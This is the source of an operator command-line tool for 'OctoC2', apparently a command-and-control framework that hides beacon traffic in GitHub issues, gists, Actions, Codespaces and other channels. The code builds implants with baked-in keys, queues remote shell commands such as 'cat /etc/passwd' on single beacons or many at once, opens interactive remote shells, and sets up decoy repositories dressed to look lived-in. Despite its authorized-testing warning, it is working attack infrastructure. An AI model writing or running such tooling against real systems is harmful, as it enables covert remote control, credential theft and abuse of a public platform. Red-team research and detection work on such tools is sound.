#!/usr/bin/env bun
/**
 * octoctl — OctoC2 Operator CLI
 *
 * Commands:
 *   keygen                         — generate operator X25519 key pair
 *   beacons                        — list registered beacons
 *   task <beaconId> --kind <kind>  — queue a task for a beacon
 *   results <beaconId>             — show decrypted task results
 *   build-beacon                   — compile implant with baked keypair
 *   drop create                    — create a signed deterministic recovery record
 *   drop list                      — inspect the deterministic recovery path
 *   proxy create                   — provision a two-repository relay
 *   proxy list                     — show configured proxy repos
 *   proxy rotate <beaconId> <json> — print signed-recovery policy fragments
 *
 * Environment (all commands except keygen):
 *   OCTOC2_OPERATOR_API_TOKEN    — operator-only controller API credential
 *   OCTOC2_OPERATOR_GITHUB_TOKEN — operator-only direct GitHub credential
 *   OCTOC2_REPO_OWNER / OCTOC2_REPO_NAME — controller repository
 *   OCTOC2_OPERATOR_SECRET       — base64url X25519 result-decryption key
 *   OCTOC2_DATA_DIR              — server data directory (default: ./data)
 */

import { Command } from "commander";
import { runKeygen }  from "./commands/keygen.ts";
import { runBeacons } from "./commands/beacons.ts";
import { runTask }    from "./commands/task.ts";
import { runResults } from "./commands/results.ts";
import { runBuildBeacon, type BuildBeaconOptions } from "./commands/buildBeacon.ts";
import { runBuildBeaconSimple } from "./commands/buildBeaconSimple.ts";
import { runDropCreate, runDropList }               from "./commands/drop.ts";
import { proxyCreate, proxyList, proxyRotate, proxyProvision } from "./commands/proxy.ts";
import { runTentaclesList, runTentaclesHealth } from "./commands/tentacles.ts";
import { runBeaconShell }  from "./commands/beaconShell.ts";
import { runBulkShell }    from "./commands/bulkShell.ts";
import { runSetup }        from "./commands/setup.ts";
import { runStart, runStop, runStatus } from "./commands/service.ts";
import { TASK_KINDS, isTaskKind } from "@octoc2/shared";

const program = new Command();

program
  .name("octoctl")
  .description("EXPERIMENTAL / NON-PRODUCTION OctoC2 operator CLI")
  .version("0.1.0")
  .addHelpText("before", `
WARNING: OctoC2 is experimental and not production-ready.
Use only in isolated environments that you own or are explicitly authorized to test.
`)
  .addHelpText("after", `
Environment variables:
  OCTOC2_OPERATOR_API_TOKEN    operator-only controller API credential
  OCTOC2_OPERATOR_GITHUB_TOKEN operator-only direct GitHub credential
  OCTOC2_REPO_OWNER            controller repository owner
  OCTOC2_REPO_NAME             controller repository name
  OCTOC2_OPERATOR_SECRET       base64url X25519 result-decryption key
  OCTOC2_DATA_DIR              server data directory (default: ./data)
`);

// ── keygen ────────────────────────────────────────────────────────────────────

program
  .command("keygen")
  .description("Generate a new operator X25519 key pair")
  .option(
    "--set-variable",
    "also push the public key to the MONITORING_PUBKEY GitHub repo variable",
    false
  )
  .action(async (opts: { setVariable: boolean }) => {
    await runKeygen({ setVariable: opts.setVariable }).catch(fatal);
  });

// ── beacons ───────────────────────────────────────────────────────────────────

program
  .command("beacons")
  .description("List registered beacons from the server registry")
  .option("--json",             "output raw JSON",    false)
  .option("--status <status>",  "filter by status: active | dormant | lost")
  .option("--data-dir <dir>",   "server data directory (overrides OCTOC2_DATA_DIR)")
  .action(async (opts: { json: boolean; status?: string; dataDir?: string }) => {
    await runBeacons({
      json:    opts.json,
      status:  opts.status as "active" | "dormant" | "lost" | undefined,
      dataDir: opts.dataDir,
    }).catch(fatal);
  });

// ── task ──────────────────────────────────────────────────────────────────────

program
  .command("task <beaconId>")
  .description("Queue a durable task through the authenticated controller API")
  .requiredOption("--kind <kind>",       `task kind: ${TASK_KINDS.join("|")}`)
  .option("--cmd <cmd>",                 "shell command to execute  (kind=shell)")
  .option("--seconds <n>",               "sleep duration in seconds (kind=sleep)")
  .option("--args-json <json>",          "raw task args as JSON string (advanced)")
  .option("--tentacle <kind>",           "force delivery via specific channel: issues|branch|actions|proxy|codespaces|relay|gist|oidc|notes|secrets|pages|stego")
  .addHelpText("after", `
Examples:
  octoctl task abc123 --kind shell --cmd "id"
  octoctl task abc123 --kind shell --cmd "cat /etc/passwd"
  octoctl task abc123 --kind exec --args-json '{"cmd":"id","args":["-u"]}'
  octoctl task abc123 --kind sleep --seconds 300
  octoctl task abc123 --kind kill
  octoctl task abc123 --kind shell --cmd "whoami" --tentacle notes
  octoctl task abc123 --kind shell --cmd "id" --tentacle gist
`)
  .action(async (
    beaconId: string,
    opts: {
      kind:        string;
      cmd?:        string;
      seconds?:    string;
      argsJson?:   string;
      tentacle?:   string;
    }
  ) => {
    if (!isTaskKind(opts.kind)) {
      throw new Error(
        `Unsupported task kind '${opts.kind}'. Valid kinds: ${TASK_KINDS.join(", ")}`,
      );
    }
    await runTask(beaconId, {
      kind:       opts.kind,
      cmd:        opts.cmd,
      seconds:    opts.seconds !== undefined ? parseInt(opts.seconds, 10) : undefined,
      argsJson:   opts.argsJson,
      tentacle:   opts.tentacle,
    }).catch(fatal);
  });

// ── results ───────────────────────────────────────────────────────────────────

program
  .command("results <beaconId>")
  .description("Fetch verified, durable task results from the controller API")
  .option("--last <n>",       "show last N results")
  .option("--since <time>",   "time window: 30m | 2h | 1d | ISO-8601 (default: 24h)")
  .option("--json",           "output raw JSON", false)
  .addHelpText("after", `
Examples:
  octoctl results abc123
  octoctl results abc123 --last 5
  octoctl results abc123 --since 2h
  octoctl results abc123 --json
`)
  .action(async (
    beaconId: string,
    opts: { last?: string; since?: string; json: boolean }
  ) => {
    await runResults(beaconId, {
      last:  opts.last !== undefined ? parseInt(opts.last, 10) : undefined,
      since: opts.since,
      json:  opts.json,
    }).catch(fatal);
  });

// ── build-beacon ──────────────────────────────────────────────────────────────

program
  .command("build-beacon")
  .description("Compile implant binary with baked-in X25519 keypair and beacon ID")
  .option("-o, --output <path>",         "output binary path (simple mode; alias for --outfile)")
  .option("--outfile <path>",            "output binary path (full mode)")
  .option("-p, --platform <platform>",   "bun platform target (simple mode, default: linux-x64)")
  .option("--beacon-id <uuid>",          "pre-assigned beacon UUID (generated if omitted)")
  .option("--source <path>",             "implant entry point", "./implant/src/index.ts")
  .option("--relay <account/repo>",      "relay consortium entry (repeatable)", (v: string, acc: string[]) => [...acc, v], [] as string[])
  .option("--target <target>",           "bun compile target (full mode, default: bun-linux-x64)")
  .option("--no-random-title",           "disable random issue title (uses default format)")
  .option("--codespace-name <name>",     "bake non-secret Codespace name (SVC_GRPC_CODESPACE_NAME)")
  .option("--github-user <user>",        "bake GitHub username for Codespace SSH auth (SVC_GITHUB_USER)")
  .option("--tentacle-priority <list>",  "bake tentacle priority order (SVC_TENTACLE_PRIORITY), e.g. codespaces,issues")
  .option("--grpc-url <url>",            "bake direct TLS gRPC endpoint (SVC_GRPC_DIRECT); hostname must match certificate SAN")
  .option("--http-url <url>",            "base HTTP URL to bake in (SVC_HTTP_URL). e.g. https://codespace-8080.app.github.dev")
  .addHelpText("after", `
Examples:
  # Simple mode (just compile, no key baking):
  octoctl build-beacon --output ./beacon
  octoctl build-beacon --output /tmp/svc-beacon-smoke --platform linux-x64
  # Full mode (baked keypair + beacon ID):
  octoctl build-beacon --outfile ./implant-abc123
  octoctl build-beacon --outfile ./implant-abc123 --relay relay1/relay-repo --relay relay2/relay-repo2
  octoctl build-beacon --outfile ./implant-abc123 --no-random-title
  # Bake a direct TLS gRPC endpoint whose hostname is present in the server certificate SAN
  octoctl build-beacon --outfile ./implant-abc123 --grpc-url grpc.example.test:50051 --tentacle-priority codespaces,issues
`)
  .action(async (opts: {
    output?: string; outfile?: string; platform?: string;
    beaconId?: string; source: string; relay: string[];
    target?: string; randomTitle: boolean;
    codespaceName?: string; githubUser?: string; tentaclePriority?: string; grpcUrl?: string; httpUrl?: string;
  }) => {
    // Simple mode: --output (or --output + --platform) — no key baking, just bun build
    if (opts.output !== undefined) {
      runBuildBeaconSimple({
        output:   opts.output,
        platform: opts.platform ?? "linux-x64",
      });
      return;
    }

    // Full mode: --outfile required
    if (!opts.outfile) {
      console.error("\n  Error: --outfile <path> is required (or use --output for simple mode)\n");
      process.exit(1);
    }

    await runBuildBeacon({
      outfile: opts.outfile,
      ...(opts.beaconId    !== undefined && { beaconId:    opts.beaconId }),
      source:  opts.source,
      relay:   opts.relay,
      target:  opts.target ?? "bun-linux-x64",
      randomTitle: opts.randomTitle,
      ...(opts.codespaceName    !== undefined && { codespaceName:    opts.codespaceName }),
      ...(opts.githubUser       !== undefined && { githubUser:       opts.githubUser }),
      ...(opts.tentaclePriority !== undefined && { tentaclePriority: opts.tentaclePriority }),
      ...(opts.grpcUrl          !== undefined && { grpcUrl:          opts.grpcUrl }),
      ...(opts.httpUrl          !== undefined && { httpUrl:          opts.httpUrl }),
    }).catch(fatal);
  });

// ── drop ──────────────────────────────────────────────────────────────────────

const dropCmd = program
  .command("drop")
  .description("Manage cryptographic dead-drops for beacon recovery");

dropCmd
  .command("create")
  .description("Publish a signed, sealed deterministic recovery record")
  .requiredOption("--beacon <id-prefix>",      "target beacon ID (prefix match)")
  .requiredOption("--configuration-file <path>", "complete recovery configuration JSON")
  .requiredOption("--generation <n>",          "monotonic recovery generation")
  .requiredOption("--recovery-signing-secret-file <path>", "base64url Ed25519 recovery secret-key file")
  .option("--recovery-signing-public-key <key>", "current recovery Ed25519 public key")
  .option("--recovery-signing-key-id <id>",    "current recovery signing key ID")
  .option("--recovery-owner <owner>",          "dedicated public recovery repository owner")
  .option("--recovery-repo <repo>",            "dedicated public recovery repository name")
  .option("--recovery-ref <ref>",              "recovery repository ref", "main")
  .option("--writer-token <token>",            "dedicated recovery repository write token")
  .option("--issued-at <time>",                "canonical issuance timestamp (defaults to now)")
  .option("--expires-at <time>",               "record expiry (defaults to lease expiry)")
  .option("--data-dir <dir>",                  "server data directory (overrides OCTOC2_DATA_DIR)")
  .action(async (opts: {
    beacon: string; configurationFile: string; generation: string;
    recoverySigningSecretFile: string; recoverySigningPublicKey?: string;
    recoverySigningKeyId?: string; recoveryOwner?: string; recoveryRepo?: string;
    recoveryRef: string; writerToken?: string; issuedAt?: string;
    expiresAt?: string; dataDir?: string;
  }) => {
    await runDropCreate({
      beacon: opts.beacon,
      configurationFile: opts.configurationFile,
      generation: parseInt(opts.generation, 10),
      recoverySigningSecretFile: opts.recoverySigningSecretFile,
      ...(opts.recoverySigningPublicKey !== undefined && {
        recoverySigningPublicKey: opts.recoverySigningPublicKey,
      }),
      ...(opts.recoverySigningKeyId !== undefined && {
        recoverySigningKeyId: opts.recoverySigningKeyId,
      }),
      ...(opts.recoveryOwner !== undefined && { recoveryOwner: opts.recoveryOwner }),
      ...(opts.recoveryRepo !== undefined && { recoveryRepo: opts.recoveryRepo }),
      recoveryRef: opts.recoveryRef,
      ...(opts.writerToken !== undefined && { writerToken: opts.writerToken }),
      ...(opts.issuedAt !== undefined && { issuedAt: opts.issuedAt }),
      ...(opts.expiresAt !== undefined && { expiresAt: opts.expiresAt }),
      ...(opts.dataDir          !== undefined && { dataDir:          opts.dataDir }),
    }).catch(fatal);
  });

dropCmd
  .command("list")
  .description("Inspect the deterministic recovery path for a beacon")
  .requiredOption("--beacon <id-prefix>", "target beacon ID (prefix match)")
  .option("--recovery-owner <owner>",      "dedicated recovery repository owner")
  .option("--recovery-repo <repo>",        "dedicated recovery repository name")
  .option("--recovery-ref <ref>",          "recovery repository ref", "main")
  .option("--data-dir <dir>",             "server data directory (overrides OCTOC2_DATA_DIR)")
  .action(async (opts: {
    beacon: string; dataDir?: string; recoveryOwner?: string;
    recoveryRepo?: string; recoveryRef: string;
  }) => {
    await runDropList({
      beacon: opts.beacon,
      ...(opts.dataDir !== undefined && { dataDir: opts.dataDir }),
      ...(opts.recoveryOwner !== undefined && { recoveryOwner: opts.recoveryOwner }),
      ...(opts.recoveryRepo !== undefined && { recoveryRepo: opts.recoveryRepo }),
      recoveryRef: opts.recoveryRef,
    }).catch(fatal);
  });

// ── proxy ─────────────────────────────────────────────────────────────────────

const proxyCmd = program
  .command("proxy")
  .description("Manage OctoProxy — GitHub Actions relay repos for beacon checkins");

proxyCmd
  .command("create")
  .description("Provision distinct decoy/control repositories as a signed relay")
  .requiredOption("--decoy-repo <owner/repo>",  "decoy repository (owner/repo)")
  .requiredOption("--beacon <id>",              "beacon ID (prefix match)")
  .option("--control-dispatch-token <token>",   "scoped credential for dispatching the control repo (or OCTOC2_PROXY_CONTROL_DISPATCH_TOKEN)")
  .option("--target-dispatch-token <token>",    "stable control egress credential authorized for all decoy repos (or OCTOC2_PROXY_TARGET_DISPATCH_TOKEN)")
  .option("--ctrl-owner <owner>",               "control repo owner (default: OCTOC2_CTRL_OWNER env)")
  .option("--ctrl-repo <name>",                 "control repo name (default: OCTOC2_CTRL_REPO env)")
  .option("--proxy-installation-id <id>",       "GitHub App installation containing the decoy repo (or OCTOC2_PROXY_INSTALLATION_ID)")
  .option("--issue-title <text>",               "title for the proxy issue", "Dependency audit: review pinned versions")
  .option("--create-repo",                      "create the decoy GitHub repo first", false)
  .option("--scaffold",                         "add README + .gitignore to make repo look lived-in", false)
  .option("--data-dir <dir>",                   "server data directory (overrides OCTOC2_DATA_DIR)")
  .addHelpText("after", `
Examples:
  Set OCTOC2_PROXY_CONTROL_DISPATCH_TOKEN, OCTOC2_PROXY_TARGET_DISPATCH_TOKEN,
  and the stable OCTOC2_PROXY_RELAY_SIGNING_KEY, then run:
  octoctl proxy create --decoy-repo acme/infra-utils --beacon abc123 --proxy-installation-id 12345
`)
  .action(async (opts: {
    decoyRepo: string; beacon: string;
    controlDispatchToken?: string; targetDispatchToken?: string;
    ctrlOwner?: string; ctrlRepo?: string; proxyInstallationId?: string;
    issueTitle: string; createRepo: boolean;
    scaffold: boolean; dataDir?: string;
  }) => {
    const [decoyOwner, decoyRepoName] = opts.decoyRepo.split("/");
    if (!decoyOwner || !decoyRepoName) {
      console.error(`\n  Error: --decoy-repo must be in owner/repo format, got '${opts.decoyRepo}'\n`);
      process.exit(1);
    }
    const ctrlOwner = opts.ctrlOwner ?? process.env["OCTOC2_CTRL_OWNER"];
    const ctrlRepo  = opts.ctrlRepo  ?? process.env["OCTOC2_CTRL_REPO"];
    if (!ctrlOwner) { console.error("\n  Error: --ctrl-owner or OCTOC2_CTRL_OWNER required\n"); process.exit(1); }
    if (!ctrlRepo)  { console.error("\n  Error: --ctrl-repo or OCTOC2_CTRL_REPO required\n");  process.exit(1); }
    const controlDispatchToken =
      opts.controlDispatchToken ??
      process.env["OCTOC2_PROXY_CONTROL_DISPATCH_TOKEN"];
    const targetDispatchToken =
      opts.targetDispatchToken ??
      process.env["OCTOC2_PROXY_TARGET_DISPATCH_TOKEN"];
    const relaySigningKey =
      process.env["OCTOC2_PROXY_RELAY_SIGNING_KEY"];
    const installationRaw =
      opts.proxyInstallationId ??
      process.env["OCTOC2_PROXY_INSTALLATION_ID"];
    if (!controlDispatchToken) {
      console.error("\n  Error: control dispatch credential is required\n");
      process.exit(1);
    }
    if (!targetDispatchToken) {
      console.error("\n  Error: target dispatch credential is required\n");
      process.exit(1);
    }
    if (!relaySigningKey) {
      console.error("\n  Error: OCTOC2_PROXY_RELAY_SIGNING_KEY is required\n");
      process.exit(1);
    }
    const proxyInstallationId = Number(installationRaw);
    if (!Number.isSafeInteger(proxyInstallationId) || proxyInstallationId <= 0) {
      console.error("\n  Error: a positive --proxy-installation-id is required\n");
      process.exit(1);
    }
    await proxyProvision({
      decoyOwner, decoyRepo: decoyRepoName,
      beaconId: opts.beacon,
      controlDispatchToken,
      targetDispatchToken,
      relaySigningKey,
      ctrlOwner,
      ctrlRepo,
      proxyInstallationId,
      innerKind:  "issues",
      issueTitle: opts.issueTitle,
      createRepo: opts.createRepo,
      scaffold:   opts.scaffold,
      ...(opts.dataDir && { dataDir: opts.dataDir }),
    }).catch(fatal);
  });

proxyCmd
  .command("templates")
  .description("Print the OctoProxy workflow YAML templates (for manual setup)")
  .action(async () => {
    await proxyCreate({
      owner: "your-org", repo: "your-decoy-repo",
      innerKind: "issues",
    }).catch(fatal);
  });

proxyCmd
  .command("list")
  .description("Show proxy routes from OCTOC2_RECOVERY_POLICIES")
  .action(async () => {
    await proxyList().catch(fatal);
  });

proxyCmd
  .command("rotate <beaconId> <newProxyRepos>")
  .description("Print server policy fragments for the next signed recovery record")
  .addHelpText("after", `
Examples:
  octoctl proxy rotate abc123 '[{"owner":"acme","repo":"decoy","innerKind":"issues","decoyIssue":7}]'
`)
  .action(async (beaconId: string, newProxyRepos: string) => {
    await proxyRotate({ beaconId, newProxyRepos }).catch(fatal);
  });

// ── beacon ────────────────────────────────────────────────────────────────────

const beaconCmd = program
  .command("beacon")
  .description("Beacon management commands");

beaconCmd
  .command("shell")
  .description("Interactive shell session over the C2 server HTTP API")
  .requiredOption("--beacon <id>",       "beacon ID (prefix match)")
  .option("--tentacle <kind>",           "force delivery via specific channel")
  .option("--server-url <url>",          "C2 server URL (overrides OCTOC2_SERVER_URL)")
  .option("--timeout <seconds>",         "max wait per command in seconds", "300")
  .addHelpText("after", `
Examples:
  OCTOC2_SERVER_URL=https://localhost:8080 octoctl beacon shell --beacon abc123
  OCTOC2_SERVER_URL=https://localhost:8080 octoctl beacon shell --beacon abc123 --tentacle notes
`)
  .action(async (opts: { beacon: string; tentacle?: string; serverUrl?: string; timeout?: string }) => {
    await runBeaconShell({
      beacon: opts.beacon,
      ...(opts.tentacle   !== undefined && { tentacle:   opts.tentacle }),
      ...(opts.serverUrl  !== undefined && { serverUrl:  opts.serverUrl }),
      ...(opts.timeout    !== undefined && { timeout:    parseInt(opts.timeout, 10) }),
    }).catch(fatal);
  });

// ── tentacles ─────────────────────────────────────────────────────────────────

const tentaclesCmd = program
  .command("tentacles")
  .description("Inspect tentacle (channel) health for registered beacons");

tentaclesCmd
  .command("list")
  .description("Show tentacle health status for all channels on a beacon")
  .requiredOption("--beacon <id>",      "beacon ID (prefix match)")
  .option("--json",                     "output raw JSON", false)
  .option("-v, --verbose",              "show full last-error details section", false)
  .option("--server-url <url>",         "C2 server URL — enables live data (overrides offline registry)")
  .option("--data-dir <dir>",           "server data directory (overrides OCTOC2_DATA_DIR)")
  .addHelpText("after", `
Examples:
  octoctl tentacles list --beacon abc123
  octoctl tentacles list --beacon abc123 --json
  octoctl tentacles list --beacon abc123 --server-url https://localhost:8080
  octoctl tentacles list --beacon abc123 --verbose
`)
  .action(async (opts: { beacon: string; json: boolean; verbose: boolean; serverUrl?: string; dataDir?: string }) => {
    await runTentaclesList({
      beacon:    opts.beacon,
      json:      opts.json,
      verbose:   opts.verbose,
      ...(opts.serverUrl !== undefined && { serverUrl: opts.serverUrl }),
      ...(opts.dataDir   !== undefined && { dataDir:   opts.dataDir }),
    }).catch(fatal);
  });

tentaclesCmd
  .command("health")
  .description("Real-time tentacle health status (alias for 'tentacles list')")
  .requiredOption("--beacon <id>",      "beacon ID (prefix match)")
  .option("--json",                     "output raw JSON", false)
  .option("-v, --verbose",              "show full last-error details section", false)
  .option("--server-url <url>",         "C2 server URL — enables live data (overrides offline registry)")
  .option("--data-dir <dir>",           "server data directory (overrides OCTOC2_DATA_DIR)")
  .addHelpText("after", `
Examples:
  octoctl tentacles health --beacon abc123
  octoctl tentacles health --beacon abc123 --json
  octoctl tentacles health --beacon abc123 --server-url https://localhost:8080
  octoctl tentacles health --beacon abc123 --verbose
`)
  .action(async (opts: { beacon: string; json: boolean; verbose: boolean; serverUrl?: string; dataDir?: string }) => {
    await runTentaclesHealth({
      beacon:    opts.beacon,
      json:      opts.json,
      verbose:   opts.verbose,
      ...(opts.serverUrl !== undefined && { serverUrl: opts.serverUrl }),
      ...(opts.dataDir   !== undefined && { dataDir:   opts.dataDir }),
    }).catch(fatal);
  });

// ── bulk ──────────────────────────────────────────────────────────────────────

const bulkCmd = program
  .command("bulk")
  .description("Bulk operator commands — target multiple beacons at once");

bulkCmd
  .command("shell")
  .description("Queue a shell command on multiple beacons simultaneously (fire-and-forget)")
  .requiredOption("--beacon-ids <ids>",  "comma-separated beacon IDs")
  .requiredOption("--cmd <command>",     "shell command to queue on each beacon")
  .option("--server-url <url>",          "C2 server URL (overrides OCTOC2_SERVER_URL)")
  .option("--token <token>",             "operator API token (overrides OCTOC2_OPERATOR_API_TOKEN)")
  .option("--json",                      "output raw JSON", false)
  .option("--wait",                      "poll each beacon for results after queueing", false)
  .option("--timeout <seconds>",         "seconds to wait for results when --wait is set (default 60)", "60")
  .addHelpText("after", `
Examples:
  octoctl bulk shell --beacon-ids abc123,def456,ghi789 --cmd "whoami"
  OCTOC2_SERVER_URL=https://localhost:8080 octoctl bulk shell --beacon-ids abc123,def456 --cmd "id" --json
  octoctl bulk shell --beacon-ids abc123,def456 --cmd "id" --wait
  octoctl bulk shell --beacon-ids abc123,def456 --cmd "id" --wait --timeout 120
`)
  .action(async (opts: {
    beaconIds:  string;
    cmd:        string;
    serverUrl?: string;
    token?:     string;
    json:       boolean;
    wait:       boolean;
    timeout:    string;
  }) => {
    await runBulkShell({
      beaconIds:   opts.beaconIds,
      cmd:         opts.cmd,
      ...(opts.serverUrl !== undefined && { serverUrl: opts.serverUrl }),
      ...(opts.token     !== undefined && { token:     opts.token }),
      json:        opts.json,
      wait:        opts.wait,
      pollTimeout: parseInt(opts.timeout, 10),
    }).catch(fatal);
  });

// ── setup (interactive wizard) ───────────────────────────────────────────────

program
  .command("setup")
  .description("Interactive setup wizard — configure C2 deployment from scratch")
  .option("--phase <phase>", "run a single phase: credentials | validate | keygen | auth | tentacles | env | build | verify")
  .action(async (opts: { phase?: string }) => {
    await runSetup(opts).catch(fatal);
  });

// ── start ────────────────────────────────────────────────────────────────────

program
  .command("start")
  .description("Start the C2 server and/or dashboard as background processes")
  .argument("[component]", "server | dashboard (default: both)")
  .option("--env <path>", "path to .env file", ".env")
  .action(async (component: string | undefined, opts: { env: string }) => {
    const valid = ["server", "dashboard", undefined];
    if (!valid.includes(component)) {
      console.error(`\n  Error: unknown component '${component}' — use server or dashboard\n`);
      process.exit(1);
    }
    await runStart({ component: component as any, env: opts.env }).catch(fatal);
  });

// ── stop ─────────────────────────────────────────────────────────────────────

program
  .command("stop")
  .description("Stop running server and/or dashboard")
  .argument("[component]", "server | dashboard (default: both)")
  .action(async (component: string | undefined) => {
    const valid = ["server", "dashboard", undefined];
    if (!valid.includes(component)) {
      console.error(`\n  Error: unknown component '${component}' — use server or dashboard\n`);
      process.exit(1);
    }
    await runStop({ component: component as any }).catch(fatal);
  });

// ── status ───────────────────────────────────────────────────────────────────

program
  .command("status")
  .description("Show running OctoC2 components")
  .action(async () => {
    await runStatus().catch(fatal);
  });

// ── update ───────────────────────────────────────────────────────────────────

program
  .command("update")
  .description("Pull latest OctoC2 from the repo and reinstall dependencies")
  .option("--branch <branch>", "branch to pull from", "main")
  .action(async (opts: { branch: string }) => {
    const { resolve } = await import("node:path");

    // Find project root — walk up from octoctl/ or use cwd
    let root = process.cwd();
    const { existsSync } = await import("node:fs");
    if (existsSync(resolve(root, "octoctl", "package.json"))) {
      // already at root
    } else if (existsSync(resolve(root, "..", "octoctl", "package.json"))) {
      root = resolve(root, "..");
    }

    const bunBin = Bun.which("bun") ?? `${process.env.HOME}/.bun/bin/bun`;

    console.log(`\n  Updating OctoC2 from ${opts.branch}…\n`);

    // 1. git pull
    const pull = Bun.spawn(["git", "pull", "origin", opts.branch], {
      cwd: root, stdout: "inherit", stderr: "inherit",
    });
    if ((await pull.exited) !== 0) {
      console.error(`\n  git pull failed.\n`);
      process.exit(1);
    }

    // 2. bun install
    console.log(`\n  Installing dependencies…\n`);
    const install = Bun.spawn([bunBin, "install"], {
      cwd: root, stdout: "inherit", stderr: "inherit",
    });
    if ((await install.exited) !== 0) {
      console.error(`\n  bun install failed.\n`);
      process.exit(1);
    }

    console.log(`\n  \x1b[32m✓\x1b[0m OctoC2 updated.\n`);
  });

// ── Error handler ─────────────────────────────────────────────────────────────

function fatal(err: unknown): never {
  const msg = err instanceof Error ? err.message : String(err);
  console.error(`\n  Error: ${msg}\n`);
  process.exit(1);
}

// ── Parse ─────────────────────────────────────────────────────────────────────

program.parseAsync(process.argv).catch(fatal);
